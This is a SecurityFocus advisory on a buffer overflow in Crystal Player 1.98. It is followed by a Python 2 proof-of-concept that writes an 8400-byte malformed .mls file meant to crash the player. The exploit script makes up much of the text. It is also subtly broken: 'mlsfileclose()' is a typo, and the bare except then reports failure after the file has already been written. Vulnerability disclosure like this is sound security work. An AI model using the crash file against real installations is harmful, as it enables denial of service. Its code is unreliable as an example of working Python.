source: http://www.securityfocus.com/bid/42727/info

Crystal Player is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

Attackers may leverage this issue to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

Crystal Player 1.98 is vulnerable; other versions may also be affected. 

print "\n\nCrystal Player v1.98 .mls File Processing DoS"

#
#http://software-files-l.cnet.com/s/software/11/00/21/13/CrystalPro.exe?e=1282330968&h=e237bd6e2c2618e09cee1995b7e71d8f&lop=link&ptype=1901&ontid=2139&siteId=4&edId=3&spi=b6d2964a3df3b4a831dfecbe47f768ab&pid=11002113&psid=10210499&fileName=CrystalPro.exe
#

buff = "D" * 8400

try:
	mlsfile = open("cp_crash.mls","w")
	mlsfile.write(buff)
	mlsfileclose()
	print "[+] Successfully created MLS File\n"
	print "[+] Load this File to Crystal Player CPU Usage shoots upto 100%\n"
	print "[+] Coded by Praveen Darshanam\n"
except:
	print "[+] Unable to Create File"